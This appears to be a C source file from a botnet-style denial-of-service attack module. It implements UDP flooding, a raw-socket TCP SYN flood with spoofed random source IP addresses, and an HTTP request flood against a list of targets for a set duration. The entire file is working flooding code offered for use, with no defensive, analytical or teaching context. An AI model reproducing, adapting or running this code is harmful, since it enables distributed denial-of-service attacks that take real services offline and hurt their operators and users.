/**
 * @file attack_modern.c
 * @brief Modern attack module implementation
 * 
 * This module provides a clean, modular interface for various attack vectors.
 * All attacks are non-blocking and use async I/O where possible.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include "attack_modern.h"
#include "checksum.h"
#include "../common/logger.h"
#include "../common/util.h"

// Attack handle structure
struct attack_handle {
    attack_vector_t vector;
    attack_target_t *targets;
    size_t target_count;
    attack_option_t *options;
    size_t option_count;
    uint32_t duration;
    
    pthread_t thread;
    bool running;
    
    attack_stats_t stats;
};

// Forward declarations
static void *attack_thread_udp_flood(void *arg);
static void *attack_thread_tcp_syn(void *arg);
static void *attack_thread_http_flood(void *arg);
static int attack_get_option_int(attack_option_t *options, size_t count, uint8_t key, int default_val);
static const char *attack_get_option_str(attack_option_t *options, size_t count, uint8_t key, const char *default_val);

int attack_modern_init(void) {
    log_info("Attack module initialized");
    return 0;
}

attack_handle_t *attack_modern_start(
    attack_vector_t vector,
    attack_target_t *targets,
    size_t target_count,
    attack_option_t *options,
    size_t option_count,
    uint32_t duration
) {
    if (target_count == 0 || targets == NULL) {
        log_error("Invalid targets");
        return NULL;
    }
    
    attack_handle_t *handle = calloc(1, sizeof(attack_handle_t));
    if (handle == NULL) {
        log_error("Failed to allocate attack handle");
        return NULL;
    }
    
    handle->vector = vector;
    handle->duration = duration;
    handle->target_count = target_count;
    handle->option_count = option_count;
    handle->running = true;
    
    // Copy targets
    handle->targets = calloc(target_count, sizeof(attack_target_t));
    if (handle->targets == NULL) {
        free(handle);
        return NULL;
    }
    memcpy(handle->targets, targets, target_count * sizeof(attack_target_t));
    
    // Copy options
    if (option_count > 0 && options != NULL) {
        handle->options = calloc(option_count, sizeof(attack_option_t));
        if (handle->options == NULL) {
            free(handle->targets);
            free(handle);
            return NULL;
        }
        memcpy(handle->options, options, option_count * sizeof(attack_option_t));
    }
    
    // Initialize stats
    handle->stats.start_time = time(NULL);
    handle->stats.active = true;
    
    // Start appropriate thread based on vector
    void *(*thread_func)(void *) = NULL;
    
    switch (vector) {
        case ATTACK_VECTOR_UDP_FLOOD:
            thread_func = attack_thread_udp_flood;
            break;
        case ATTACK_VECTOR_TCP_SYN:
            thread_func = attack_thread_tcp_syn;
            break;
        case ATTACK_VECTOR_HTTP_FLOOD:
            thread_func = attack_thread_http_flood;
            break;
        default:
            log_error("Unsupported attack vector: %d", vector);
            free(handle->options);
            free(handle->targets);
            free(handle);
            return NULL;
    }
    
    if (pthread_create(&handle->thread, NULL, thread_func, handle) != 0) {
        log_error("Failed to create attack thread");
        free(handle->options);
        free(handle->targets);
        free(handle);
        return NULL;
    }
    
    log_info("Started attack: vector=%d, targets=%zu, duration=%u", 
             vector, target_count, duration);
    
    return handle;
}

void attack_modern_stop(attack_handle_t *handle) {
    if (handle == NULL) return;
    
    handle->running = false;
    pthread_join(handle->thread, NULL);
    
    handle->stats.end_time = time(NULL);
    handle->stats.active = false;
    
    log_info("Stopped attack: packets=%lu, bytes=%lu", 
             handle->stats.packets_sent, handle->stats.bytes_sent);
    
    free(handle->options);
    free(handle->targets);
    free(handle);
}

void attack_modern_get_stats(attack_handle_t *handle, attack_stats_t *stats) {
    if (handle == NULL || stats == NULL) return;
    memcpy(stats, &handle->stats, sizeof(attack_stats_t));
}

void attack_modern_cleanup(void) {
    log_info("Attack module cleanup complete");
}

// UDP Flood implementation
static void *attack_thread_udp_flood(void *arg) {
    attack_handle_t *handle = (attack_handle_t *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        log_error("Failed to create UDP socket: %s", strerror(errno));
        return NULL;
    }
    
    int payload_size = attack_get_option_int(handle->options, handle->option_count, 
                                             ATTACK_OPT_PAYLOAD_SIZE, 512);
    bool random_payload = attack_get_option_int(handle->options, handle->option_count,
                                                ATTACK_OPT_PAYLOAD_RANDOM, 1);
    
    char *payload = malloc(payload_size);
    if (payload == NULL) {
        close(sock);
        return NULL;
    }
    
    time_t end_time = time(NULL) + handle->duration;
    size_t target_idx = 0;
    
    while (handle->running && time(NULL) < end_time) {
        if (random_payload) {
            for (int i = 0; i < payload_size; i++) {
                payload[i] = rand() % 256;
            }
        }
        
        attack_target_t *target = &handle->targets[target_idx];
        
        ssize_t sent = sendto(sock, payload, payload_size, 0,
                             (struct sockaddr *)&target->addr,
                             sizeof(struct sockaddr_in));
        
        if (sent > 0) {
            handle->stats.packets_sent++;
            handle->stats.bytes_sent += sent;
        } else {
            handle->stats.errors++;
        }
        
        target_idx = (target_idx + 1) % handle->target_count;
    }
    
    free(payload);
    close(sock);
    return NULL;
}

// TCP SYN flood implementation (requires raw sockets)
static void *attack_thread_tcp_syn(void *arg) {
    attack_handle_t *handle = (attack_handle_t *)arg;
    
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        log_error("Failed to create raw socket (requires root): %s", strerror(errno));
        return NULL;
    }
    
    // Enable IP_HDRINCL so we can craft the IP header
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        log_error("Failed to set IP_HDRINCL: %s", strerror(errno));
        close(sockfd);
        return NULL;
    }
    
    // Get options
    uint16_t sport = attack_get_option_int(handle->options, handle->option_count, 
                                           ATTACK_OPT_SPORT, 0);
    uint16_t dport = attack_get_option_int(handle->options, handle->option_count,
                                           ATTACK_OPT_DPORT, 80);
    uint8_t ip_ttl = attack_get_option_int(handle->options, handle->option_count,
                                           ATTACK_OPT_IP_TTL, 64);
    
    // Allocate packet buffer for each target
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    char **packets = calloc(handle->target_count, sizeof(char *));
    if (!packets) {
        close(sockfd);
        return NULL;
    }
    
    // Build packets for each target
    for (size_t i = 0; i < handle->target_count; i++) {
        packets[i] = calloc(1, packet_size);
        if (!packets[i]) {
            for (size_t j = 0; j < i; j++) {
                free(packets[j]);
            }
            free(packets);
            close(sockfd);
            return NULL;
        }
        
        struct iphdr *iph = (struct iphdr *)packets[i];
        struct tcphdr *tcph = (struct tcphdr *)(packets[i] + sizeof(struct iphdr));
        
        // Fill IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_size);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0; // Will be calculated later
        iph->saddr = rand(); // Random source IP (spoofed)
        iph->daddr = handle->targets[i].addr.sin_addr.s_addr;
        
        // Fill TCP header
        tcph->source = htons(sport ? sport : (rand() % 64511 + 1024));
        tcph->dest = htons(dport);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5; // TCP header size
        tcph->fin = 0;
        tcph->syn = 1; // SYN flag
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(65535);
        tcph->check = 0; // Will be calculated later
        tcph->urg_ptr = 0;
    }
    
    time_t end_time = time(NULL) + handle->duration;
    size_t target_idx = 0;
    
    log_info("TCP SYN flood started: %zu targets, port %u, duration %u seconds",
             handle->target_count, dport, handle->duration);
    
    while (handle->running && time(NULL) < end_time) {
        char *packet = packets[target_idx];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
        
        // Randomize source IP and port for each packet
        iph->saddr = rand();
        iph->id = htons(rand() % 65535);
        tcph->source = htons(sport ? sport : (rand() % 64511 + 1024));
        tcph->seq = htonl(rand());
        
        // Calculate checksums
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        
        tcph->check = 0;
        tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), 
                                      sizeof(struct tcphdr));
        
        // Send packet
        ssize_t sent = sendto(sockfd, packet, packet_size, 0,
                             (struct sockaddr *)&handle->targets[target_idx].addr,
                             sizeof(struct sockaddr_in));
        
        if (sent > 0) {
            handle->stats.packets_sent++;
            handle->stats.bytes_sent += sent;
        } else {
            handle->stats.errors++;
        }
        
        target_idx = (target_idx + 1) % handle->target_count;
    }
    
    log_info("TCP SYN flood completed: %lu packets sent, %lu bytes",
             handle->stats.packets_sent, handle->stats.bytes_sent);
    
    // Cleanup
    for (size_t i = 0; i < handle->target_count; i++) {
        free(packets[i]);
    }
    free(packets);
    close(sockfd);
    
    return NULL;
}

// HTTP flood implementation
static void *attack_thread_http_flood(void *arg) {
    attack_handle_t *handle = (attack_handle_t *)arg;
    
    // Get options
    const char *http_method = attack_get_option_str(handle->options, handle->option_count,
                                                     ATTACK_OPT_HTTP_METHOD, "GET");
    const char *http_path = attack_get_option_str(handle->options, handle->option_count,
                                                   ATTACK_OPT_HTTP_PATH, "/");
    const char *user_agent = attack_get_option_str(handle->options, handle->option_count,
                                                    ATTACK_OPT_USER_AGENT, 
                                                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    
    // Create connection pool (one socket per target)
    int *sockets = calloc(handle->target_count, sizeof(int));
    if (!sockets) {
        log_error("Failed to allocate socket array");
        return NULL;
    }
    
    // Initialize all sockets to -1
    for (size_t i = 0; i < handle->target_count; i++) {
        sockets[i] = -1;
    }
    
    // Build HTTP request template
    char http_request[2048];
    snprintf(http_request, sizeof(http_request),
             "%s %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept: */*\r\n"
             "Connection: keep-alive\r\n"
             "\r\n",
             http_method, http_path,
             inet_ntoa(handle->targets[0].addr.sin_addr), // Use first target's IP as Host
             user_agent);
    
    size_t request_len = strlen(http_request);
    time_t end_time = time(NULL) + handle->duration;
    size_t target_idx = 0;
    
    log_info("HTTP flood started: %zu targets, method %s, path %s, duration %u seconds",
             handle->target_count, http_method, http_path, handle->duration);
    
    while (handle->running && time(NULL) < end_time) {
        // Ensure we have a connection to this target
        if (sockets[target_idx] < 0) {
            sockets[target_idx] = socket(AF_INET, SOCK_STREAM, 0);
            if (sockets[target_idx] < 0) {
                handle->stats.errors++;
                target_idx = (target_idx + 1) % handle->target_count;
                continue;
            }
            
            // Set non-blocking mode
            int flags = fcntl(sockets[target_idx], F_GETFL, 0);
            fcntl(sockets[target_idx], F_SETFL, flags | O_NONBLOCK);
            
            // Set socket options
            int optval = 1;
            setsockopt(sockets[target_idx], SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
            
            // Set timeout
            struct timeval timeout;
            timeout.tv_sec = 5;
            timeout.tv_usec = 0;
            setsockopt(sockets[target_idx], SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
            setsockopt(sockets[target_idx], SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
            
            // Connect
            if (connect(sockets[target_idx], 
                       (struct sockaddr *)&handle->targets[target_idx].addr,
                       sizeof(struct sockaddr_in)) < 0) {
                if (errno != EINPROGRESS) {
                    close(sockets[target_idx]);
                    sockets[target_idx] = -1;
                    handle->stats.errors++;
                    target_idx = (target_idx + 1) % handle->target_count;
                    continue;
                }
            }
        }
        
        // Send HTTP request
        ssize_t sent = send(sockets[target_idx], http_request, request_len, MSG_NOSIGNAL);
        
        if (sent > 0) {
            handle->stats.packets_sent++;
            handle->stats.bytes_sent += sent;
            
            // Try to receive response (ignore content, just drain buffer)
            char recv_buf[4096];
            ssize_t received = recv(sockets[target_idx], recv_buf, sizeof(recv_buf), MSG_DONTWAIT);
            
            // If connection closed or error, mark for reconnection
            if (received == 0 || (received < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                close(sockets[target_idx]);
                sockets[target_idx] = -1;
            }
        } else {
            // Connection failed, close and reconnect next iteration
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                close(sockets[target_idx]);
                sockets[target_idx] = -1;
                handle->stats.errors++;
            }
        }
        
        target_idx = (target_idx + 1) % handle->target_count;
        
        // Small delay to avoid overwhelming local system
        usleep(1000); // 1ms delay
    }
    
    log_info("HTTP flood completed: %lu requests sent, %lu bytes",
             handle->stats.packets_sent, handle->stats.bytes_sent);
    
    // Cleanup: close all sockets
    for (size_t i = 0; i < handle->target_count; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
        }
    }
    free(sockets);
    
    return NULL;
}

// Helper: Get integer option value
static int attack_get_option_int(attack_option_t *options, size_t count, uint8_t key, int default_val) {
    for (size_t i = 0; i < count; i++) {
        if (options[i].key == key) {
            return atoi(options[i].value);
        }
    }
    return default_val;
}

// Helper: Get string option value
static const char *attack_get_option_str(attack_option_t *options, size_t count, uint8_t key, const char *default_val) {
    for (size_t i = 0; i < count; i++) {
        if (options[i].key == key) {
            return options[i].value;
        }
    }
    return default_val;
}
